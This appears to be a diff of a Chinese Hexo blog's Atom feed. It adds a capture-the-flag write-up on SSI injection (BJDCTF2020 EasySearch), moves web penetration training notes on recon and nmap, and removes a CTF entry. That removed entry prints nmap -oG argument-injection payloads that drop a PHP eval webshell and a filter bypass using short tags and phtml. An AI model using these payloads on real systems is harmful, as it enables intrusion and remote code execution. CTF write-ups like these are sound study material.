@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-07-30T10:47:34.990Z</updated>
+  <updated>2021-07-31T13:02:55.677Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf20</title>
+    <link href="http://example.com/2021/07/31/buuctf20/"/>
+    <id>http://example.com/2021/07/31/buuctf20/</id>
+    <published>2021-07-31T09:52:20.000Z</published>
+    <updated>2021-07-31T13:02:55.677Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>打开容器，发现是一个登入页面</p><p><img src="/2021/07/31/buuctf20/image-20210731193659676.png" alt="image-20210731193659676"></p><h4 id="一-初步探索"><a href="#一-初步探索" class="headerlink" title="一.初步探索"></a>一.初步探索</h4><p>尝试sql注入，但是不管输入什么都是回显</p><p><img src="/2021/07/31/buuctf20/image-20210731194025910.png" alt="image-20210731194025910"></p><p>看来不是考察SQL注入，看一下源码，也没有什么线索，用dirsearch根本跑不出来，buu会一直崩。</p><p>只能手工来测试了，之前有存一个常见文件备份后缀的名单<img src="/2021/07/31/buuctf20/image-20210731194457855.png" alt="image-20210731194457855"></p><p>运气比较好，第二个就试出来了源码泄露：</p><p><img src="/2021/07/31/buuctf20/image-20210731194618345.png" alt="image-20210731194618345"></p><h4 id="二-代码审计"><a href="#二-代码审计" class="headerlink" title="二.代码审计"></a>二.代码审计</h4><p>POST参数$username和$password，if语句判断$password经过MD5编码后截取前六位是否等于<code>6d0bc1</code></p><p>然后他会构建一个文件的路径，路径的其中一部分是调用get_hash()函数随机生成的</p><p>不过他这个<code>.shtnl</code>后缀的文件是什么我还是第一次见</p><h4 id="三-预备知识"><a href="#三-预备知识" class="headerlink" title="三.预备知识"></a>三.预备知识</h4><ol><li><p><code>shtml</code>简介 </p><pre><code>SSI（Server Side Include)，通常称为服务器端嵌入，是一种类似于ASP的基于服务器的网页制作技术。大多数（尤其是基于Unix平台）的WEB服务器如Netscape Enterprise Server等均支持SSI命令。 SSI工作原理：在一个通常**以.shtml为扩展名**的SSI文件中，标准的HTML编码会被直接送到浏览器上，而内嵌Perl语言形式的SSI命令则先被网络服务器解释执行，如果是标准输出的话，输出信息也将作为标准的HTML而被送至浏览器。</code></pre></li><li><p>SSI远程命令执行漏洞</p><p>详见：<a href="https://cloud.tencent.com/developer/article/1540513">https://cloud.tencent.com/developer/article/1540513</a></p></li></ol><p>​                  <a href="https://blog.csdn.net/qq_40657585/article/details/84260844">https://blog.csdn.net/qq_40657585/article/details/84260844</a></p><h4 id="四-思路构建"><a href="#四-思路构建" class="headerlink" title="四.思路构建"></a>四.思路构建</h4><p>我们先登入<code>manage system</code>看看。那么首先要找到符合if语句的$password</p><p>拿别人的脚本跑一下：<img src="/2021/07/31/buuctf20/image-20210731202016637.png" alt="image-20210731202016637"></p><p>POST数据</p><p><img src="/2021/07/31/buuctf20/image-20210731202346636.png" alt="image-20210731202346636"></p><p>发现回显给我们一个文件名，这个就是源码里构造的文件名了</p><p>访问一下：</p><p><img src="/2021/07/31/buuctf20/image-20210731203742131.png" alt="image-20210731203742131"></p><p>那我们现在要想怎么利用这个SSI注入了，由于$password的值被强制了，根据网页的回显感觉那注入点可能在$username或者cilent-ip</p><p>但是我伪造cilent-ip发现回显的<code>Client IP</code>的值都不会变，包括XFF也是，那么只剩下$username最后的希望了</p><p><img src="/2021/07/31/buuctf20/image-20210731204417355.png" alt="image-20210731204417355"></p><p>访问回显的文件</p><p><img src="/2021/07/31/buuctf20/image-20210731204435297.png" alt="image-20210731204435297"></p><p>成功回显当前文件夹目录，但是flag不在这个目录下，访问上一级目录：</p><p><img src="/2021/07/31/buuctf20/image-20210731210011555.png" alt="image-20210731210011555"></p><p><img src="/2021/07/31/buuctf20/image-20210731210023200.png" alt="image-20210731210023200"></p><p>cat flag文件</p><p><img src="/2021/07/31/buuctf20/image-20210731210240406.png" alt="image-20210731210240406"></p><p><img src="/2021/07/31/buuctf20/image-20210731210221758.png" alt="image-20210731210221758"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;BJDCTF2020-EasySearch&quot;&gt;&lt;a href=&quot;#BJDCTF2020-EasySearch&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]EasySearch&quot;&gt;&lt;/a&gt;[BJDCTF2020]EasySearch</summary>
+      
+    
+    
+    
+    
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf19</title>
@@ -29,28 +51,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;CISCN2019-华东南赛区-Web11&quot;&gt;&lt;a href=&quot;#CISCN2019-华东南赛区-Web11&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华东南赛区]Web11&quot;&gt;&lt;/a&gt;[CISCN2019 华东南赛区]Web11</summary>
-      
-    
-    
-    
-    
-    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>buutcf18</title>
-    <link href="http://example.com/2021/07/29/buutcf18/"/>
-    <id>http://example.com/2021/07/29/buutcf18/</id>
-    <published>2021-07-29T14:08:58.000Z</published>
-    <updated>2021-07-30T04:09:07.997Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>这题和之前的<code>[BUUCTF 2018]Online Tool</code>很像</p><p>试用之前的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39;</span><br></pre></td></tr></table></figure><p>回显<img src="/2021/07/29/buutcf18/image-20210730120023112.png" alt="image-20210730120023112"></p><p>说明存在防火墙过滤，fuzz发现过滤了<code>php</code></p><p>这里我们利用短标签绕过<code>=</code>替换第一个php，用phtml替换第二个php</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.phtml &#39;</span><br></pre></td></tr></table></figure><p>回显</p><p><img src="/2021/07/29/buutcf18/image-20210730120301221.png" alt="image-20210730120301221"></p><p>但是我们这边不知道为什么没办法用蚁剑直接连接</p><p>源码提示flag在根目录下</p><p><img src="/2021/07/29/buutcf18/image-20210730120859946.png" alt="image-20210730120859946"></p><p>尝试POST命令<img src="/2021/07/29/buutcf18/image-20210730120711045.png" alt="image-20210730120711045"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-朱雀组-Nmap&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-Nmap&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]Nmap&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]Nmap&lt;/h1&gt;&lt;p&gt;这题和之前的&lt;c</summary>
       
     
     
@@ -1200,6 +1200,28 @@
   </entry>
   
   <entry>
+    <title>2021.1月web渗透培训</title>
+    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/"/>
+    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/</id>
+    <published>2021-01-27T02:56:06.000Z</published>
+    <updated>2021-01-29T03:13:47.624Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="web渗透的宏观思路："><a href="#web渗透的宏观思路：" class="headerlink" title="web渗透的宏观思路："></a>web渗透的宏观思路：</h3><h5 id="a-信息收集"><a href="#a-信息收集" class="headerlink" title="a.信息收集"></a>a.信息收集</h5><h5 id="b-漏洞挖掘"><a href="#b-漏洞挖掘" class="headerlink" title="b.漏洞挖掘"></a>b.漏洞挖掘</h5><h5 id="c-漏洞利用"><a href="#c-漏洞利用" class="headerlink" title="c.漏洞利用"></a>c.漏洞利用</h5><h5 id="d-输出渗透测试报告"><a href="#d-输出渗透测试报告" class="headerlink" title="d.输出渗透测试报告"></a>d.输出渗透测试报告</h5><h4 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h4><p>1.基本信息：</p><p>《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家；</p><p>​    获取子域名–子域名挖掘机</p><p>​    获取域名或IP地址–<a href="http://viewdns.info、https//www.dnsdb.io">http://viewdns.info、https://www.dnsdb.io</a></p><p>​    根据IP地址查询同一IP地址的其他信息–<a href="http://114best.com/ip/114.aspx?w=">http://114best.com/ip/114.aspx?w=</a></p><p>《端口：80（http）443（HTTPS） 445（共享文件夹）；</p><p>《服务（web版本），服务版本；</p><p>2.os操作系统版本：</p><p>linux，wind，mac</p><p>3.web中间件（web程序，用来提供网页服务）</p><p>Apache（主流），iis，Nginx，weblogic</p><p>4.数据库</p><p>类型、版本：mysql，mssql，oracle，access</p><p>5.服务器后端的脚本类型、版本</p><p>PHP、JSP、ASP</p><h5 id="端口扫描技术–NMAP"><a href="#端口扫描技术–NMAP" class="headerlink" title="~端口扫描技术–NMAP"></a>~端口扫描技术–NMAP</h5><p>基本命令格式：nmap -参数 ip/ip段/主机地址</p><h6 id="Nmap-TCP扫描端口选项"><a href="#Nmap-TCP扫描端口选项" class="headerlink" title="Nmap TCP扫描端口选项:"></a>Nmap TCP扫描端口选项:</h6><p>-sP：用ping的方式判断是否有存活主机,不扫描端口。<br>-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。<br>-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。<br>-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防<br>火墙的过滤规则)。</p><h6 id="Nmap-UDP扫描端口选项"><a href="#Nmap-UDP扫描端口选项" class="headerlink" title="Nmap UDP扫描端口选项:"></a>Nmap UDP扫描端口选项:</h6><p>-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。</p><h6 id="Nmap目标端口选项"><a href="#Nmap目标端口选项" class="headerlink" title="Nmap目标端口选项:"></a>Nmap目标端口选项:</h6><p>-p：扫描指定的端口<br>-F：快速扫描100个常用的端口<br>-r：顺序扫描，按从小到大的顺序进行端口扫描</p><h6 id="Nmap输出选项"><a href="#Nmap输出选项" class="headerlink" title="Nmap输出选项:"></a>Nmap输出选项:</h6><p>-oN：标准输出为指定的文件<br>-oX：生成XML格式文件可以转换成HTML文件</p><h6 id="其他常用选项"><a href="#其他常用选项" class="headerlink" title="其他常用选项:"></a>其他常用选项:</h6><p>-sV：检测服务端软件版本信息<br>-O：检测操作系统信息<br>-Pn：禁用nmap的主机检测功能<br>-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p><p>注：nmap -sP ip段可检测该网段下所有存活的主机</p><p>本章参考ppt：<a href="https://kdocs.cn/l/ctOPJlaBJgUw">https://kdocs.cn/l/ctOPJlaBJgUw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;web渗透的宏观思路：&quot;&gt;&lt;a href=&quot;#web渗透的宏观思路：&quot; class=&quot;headerlink&quot; title=&quot;web渗透的宏观思路：&quot;&gt;&lt;/a&gt;web渗透的宏观思路：&lt;/h3&gt;&lt;h5 id=&quot;a-信息收集&quot;&gt;&lt;a href=&quot;#a-信息收集&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2021-1月web渗透培训(2)</title>
     <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/"/>
     <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(2)/</id>
@@ -1215,28 +1237,6 @@
 &lt;p&gt;将用户的输入当作代码/指令，在数据库中操作、执行&lt;/p&gt;
 &lt;p&gt;例如：用户名：admin 密码：123&lt;/p&gt;
 &lt;p&gt;正常带入数据库中执行：select *from users where username=‘admin’ an</summary>
-      
-    
-    
-    
-    
-    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2021.1月web渗透培训</title>
-    <link href="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/"/>
-    <id>http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/</id>
-    <published>2021-01-27T02:56:06.000Z</published>
-    <updated>2021-01-29T03:13:47.624Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="web渗透的宏观思路："><a href="#web渗透的宏观思路：" class="headerlink" title="web渗透的宏观思路："></a>web渗透的宏观思路：</h3><h5 id="a-信息收集"><a href="#a-信息收集" class="headerlink" title="a.信息收集"></a>a.信息收集</h5><h5 id="b-漏洞挖掘"><a href="#b-漏洞挖掘" class="headerlink" title="b.漏洞挖掘"></a>b.漏洞挖掘</h5><h5 id="c-漏洞利用"><a href="#c-漏洞利用" class="headerlink" title="c.漏洞利用"></a>c.漏洞利用</h5><h5 id="d-输出渗透测试报告"><a href="#d-输出渗透测试报告" class="headerlink" title="d.输出渗透测试报告"></a>d.输出渗透测试报告</h5><h4 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h4><p>1.基本信息：</p><p>《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家；</p><p>​    获取子域名–子域名挖掘机</p><p>​    获取域名或IP地址–<a href="http://viewdns.info、https//www.dnsdb.io">http://viewdns.info、https://www.dnsdb.io</a></p><p>​    根据IP地址查询同一IP地址的其他信息–<a href="http://114best.com/ip/114.aspx?w=">http://114best.com/ip/114.aspx?w=</a></p><p>《端口：80（http）443（HTTPS） 445（共享文件夹）；</p><p>《服务（web版本），服务版本；</p><p>2.os操作系统版本：</p><p>linux，wind，mac</p><p>3.web中间件（web程序，用来提供网页服务）</p><p>Apache（主流），iis，Nginx，weblogic</p><p>4.数据库</p><p>类型、版本：mysql，mssql，oracle，access</p><p>5.服务器后端的脚本类型、版本</p><p>PHP、JSP、ASP</p><h5 id="端口扫描技术–NMAP"><a href="#端口扫描技术–NMAP" class="headerlink" title="~端口扫描技术–NMAP"></a>~端口扫描技术–NMAP</h5><p>基本命令格式：nmap -参数 ip/ip段/主机地址</p><h6 id="Nmap-TCP扫描端口选项"><a href="#Nmap-TCP扫描端口选项" class="headerlink" title="Nmap TCP扫描端口选项:"></a>Nmap TCP扫描端口选项:</h6><p>-sP：用ping的方式判断是否有存活主机,不扫描端口。<br>-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。<br>-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。<br>-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防<br>火墙的过滤规则)。</p><h6 id="Nmap-UDP扫描端口选项"><a href="#Nmap-UDP扫描端口选项" class="headerlink" title="Nmap UDP扫描端口选项:"></a>Nmap UDP扫描端口选项:</h6><p>-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。</p><h6 id="Nmap目标端口选项"><a href="#Nmap目标端口选项" class="headerlink" title="Nmap目标端口选项:"></a>Nmap目标端口选项:</h6><p>-p：扫描指定的端口<br>-F：快速扫描100个常用的端口<br>-r：顺序扫描，按从小到大的顺序进行端口扫描</p><h6 id="Nmap输出选项"><a href="#Nmap输出选项" class="headerlink" title="Nmap输出选项:"></a>Nmap输出选项:</h6><p>-oN：标准输出为指定的文件<br>-oX：生成XML格式文件可以转换成HTML文件</p><h6 id="其他常用选项"><a href="#其他常用选项" class="headerlink" title="其他常用选项:"></a>其他常用选项:</h6><p>-sV：检测服务端软件版本信息<br>-O：检测操作系统信息<br>-Pn：禁用nmap的主机检测功能<br>-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p><p>注：nmap -sP ip段可检测该网段下所有存活的主机</p><p>本章参考ppt：<a href="https://kdocs.cn/l/ctOPJlaBJgUw">https://kdocs.cn/l/ctOPJlaBJgUw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;web渗透的宏观思路：&quot;&gt;&lt;a href=&quot;#web渗透的宏观思路：&quot; class=&quot;headerlink&quot; title=&quot;web渗透的宏观思路：&quot;&gt;&lt;/a&gt;web渗透的宏观思路：&lt;/h3&gt;&lt;h5 id=&quot;a-信息收集&quot;&gt;&lt;a href=&quot;#a-信息收集&quot; cla</summary>
       
     
     
